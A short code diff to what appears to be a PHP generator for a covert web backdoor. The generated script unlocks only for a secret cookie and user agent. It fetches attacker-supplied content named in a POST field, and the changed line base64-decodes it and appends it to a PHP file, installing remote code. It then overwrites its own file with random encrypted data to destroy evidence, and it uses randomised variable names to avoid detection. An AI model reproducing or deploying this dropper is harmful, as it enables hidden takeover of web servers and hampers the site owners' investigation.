@@ -39,7 +39,7 @@ if (isset(\$_COOKIE['$cookieName']) && \$_SERVER['HTTP_USER_AGENT'] === '$random
                 \${$random_data_var}[8] = chr(ord(\${$random_data_var}[8]) & 0x3f | 0x80);
                 echo vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex(\$$random_data_var), 4)).PHP_EOL.PHP_EOL;
             }
-            fputs(fopen('./$filename.php', 'a+'),file_get_contents(\${$post_variable}[2]));
+            fputs(fopen('./$filename.php', 'a+'), base64_decode(file_get_contents(\${$post_variable}[2])));
             foreach (file(\$_SERVER['SCRIPT_FILENAME']) as \$line){
                 fwrite(fopen(\$_SERVER['SCRIPT_FILENAME'], 'w'), openssl_encrypt(\$line, 'aes-256-ctr', bin2hex(openssl_random_pseudo_bytes(100)), OPENSSL_RAW_DATA|OPENSSL_NO_PADDING|OPENSSL_ZERO_PADDING, openssl_random_pseudo_bytes((int)openssl_cipher_iv_length('aes-256-ctr'))));
             }
